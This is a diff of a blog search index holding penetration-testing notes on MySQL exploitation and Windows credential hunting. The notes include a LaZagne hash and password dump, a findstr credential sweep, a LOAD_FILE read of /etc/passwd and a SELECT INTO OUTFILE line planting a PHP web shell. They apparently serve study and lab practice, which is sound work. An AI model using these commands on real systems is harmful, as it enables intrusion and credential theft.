@@ -1,41 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Credential Hunting</title>
-    <url>/2025/11/26/Credential-Hunting/</url>
-    <content><![CDATA[<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
-<ul>
-<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
-<li><code>Application credentials</code></li>
-<li><code>Wifi passwords</code></li>
-<li><code>Chat app passwords</code></li>
-<li><code>Mail client passwords</code></li>
-<li><code>KeePass memory extraction</code></li>
-<li><code>Windows Credential Manager secrets (current user only)</code></li>
-</ul>
-<p>Administrator Access :</p>
-<ul>
-<li><code>LSASS</code></li>
-<li><code>LSA</code></li>
-</ul>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>Lazagne</tag>
-        <tag>Search-for-File-Content</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DPAPI</title>
     <url>/2025/11/26/DPAPI/</url>
     <content><![CDATA[<h2 id="Default-Location"><a href="#Default-Location" class="headerlink" title="Default Location"></a>Default Location</h2><p>Credentials are stored in special encrypted folders on the computer under the user and system profiles : </p>
@@ -357,46 +322,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Exploitation</title>
-    <url>/2025/11/21/MySQL-Exploitation/</url>
-    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
-<ul>
-<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
-</li>
-<li><p><strong>Settings: of Secure File Privileges</strong></p>
-<ul>
-<li><p><strong>Empty:</strong> No restriction (not secure).</p>
-</li>
-<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
-</li>
-<li><p><strong>NULL:</strong> File operations are disabled.</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Linux</category>
-        <category>Service-Exploitation</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>Exploitation</tag>
-        <tag>MySQL-Read-Files</tag>
-        <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pivoting And Port Forwarding</title>
     <url>/2025/11/22/Pivoting-And-Port-Forwarding/</url>
     <content><![CDATA[<p>n &#x3D; Our Attacker Machine</p>
@@ -550,6 +475,92 @@
         <tag>socat</tag>
         <tag>Reverse-Port-Forwarding</tag>
         <tag>Chisel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL Exploitation</title>
+    <url>/2025/11/21/MySQL-Exploitation/</url>
+    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
+<ul>
+<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
+</li>
+<li><p><strong>Settings: of Secure File Privileges</strong></p>
+<ul>
+<li><p><strong>Empty:</strong> No restriction (not secure).</p>
+</li>
+<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
+</li>
+<li><p><strong>NULL:</strong> File operations are disabled.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Linux</category>
+        <category>Service-Exploitation</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>Exploitation</tag>
+        <tag>MySQL-Read-Files</tag>
+        <tag>MySQL-Write-Files</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows Credential Hunting</title>
+    <url>/2025/11/26/Windows-Credential-Hunting/</url>
+    <content><![CDATA[<h2 id="Common-Password-Location"><a href="#Common-Password-Location" class="headerlink" title="Common Password Location"></a>Common Password Location</h2><ul>
+<li><code>Passwords in Group Policy in the SYSVOL share</code></li>
+<li><code>Passwords in scripts in the SYSVOL share</code></li>
+<li><code>Password in scripts on IT shares</code></li>
+<li><code>Passwords in web.config files on dev machines and IT shares</code></li>
+<li><code>Password in unattend.xml</code></li>
+<li><code>Passwords in the AD user or computer description fields</code></li>
+<li><code>KeePass databases (if we are able to guess or crack the master password)</code></li>
+<li><code>Found on user systems and shares</code></li>
+<li><code>Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint</code></li>
+</ul>
+<h2 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h2><p>Normal User Access : </p>
+<ul>
+<li><code>Browser passwords (Chrome / Edge / Firefox)</code></li>
+<li><code>Application credentials</code></li>
+<li><code>Wifi passwords</code></li>
+<li><code>Chat app passwords</code></li>
+<li><code>Mail client passwords</code></li>
+<li><code>KeePass memory extraction</code></li>
+<li><code>Windows Credential Manager secrets (current user only)</code></li>
+</ul>
+<p>Administrator Access :</p>
+<ul>
+<li><code>LSASS</code></li>
+<li><code>LSA</code></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">bob</span>\<span class="title">Desktop</span>&gt; <span class="title">start</span> <span class="title">LaZagne.exe</span> <span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">Guest</span>:501:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">DefaultAccount</span>:503:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span></span><br><span class="line"><span class="function"><span class="title">WDAGUtilityAccount</span>:504:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:72639<span class="title">bbb94990305b5a015220f8de34e</span>:::</span></span><br><span class="line"><span class="function"><span class="title">bob</span>:1001:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:3<span class="title">c0e5d303ec84884ad5c3b7876a06ea6</span>:::</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">########## <span class="title">User</span>: <span class="title">bob</span> ##########</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------- <span class="title">Winscp</span> <span class="title">passwords</span> -----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[+] <span class="title">Password</span> <span class="title">found</span> !!!</span></span><br><span class="line"><span class="function"><span class="title">URL</span>: 10.129.202.64</span></span><br><span class="line"><span class="function"><span class="title">Login</span>: <span class="title">ubuntu</span></span></span><br><span class="line"><span class="function"><span class="title">Password</span>: <span class="title">FSadmin123</span></span></span><br><span class="line"><span class="function"><span class="title">Port</span>: 22</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Search-for-File-Content-findstr"><a href="#Search-for-File-Content-findstr" class="headerlink" title="Search for File Content - findstr"></a>Search for File Content - findstr</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">findstr /SIM /C:<span class="string">&quot;password&quot;</span> /C:<span class="string">&quot;passphrase&quot;</span> /C:<span class="string">&quot;key&quot;</span> /C:<span class="string">&quot;username&quot;</span> /C:<span class="string">&quot;user account&quot;</span> /C:<span class="string">&quot;creds&quot;</span> /C:<span class="string">&quot;users&quot;</span> /C:<span class="string">&quot;passkeys&quot;</span> /C:<span class="string">&quot;configuration&quot;</span> /C:<span class="string">&quot;dbcredential&quot;</span> /C:<span class="string">&quot;dbpassword&quot;</span> /C:<span class="string">&quot;pwd&quot;</span> /C:<span class="string">&quot;login&quot;</span> /C:<span class="string">&quot;credentials&quot;</span> *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
+      </categories>
+      <tags>
+        <tag>Lazagne</tag>
+        <tag>Search-for-File-Content</tag>
       </tags>
   </entry>
 </search>
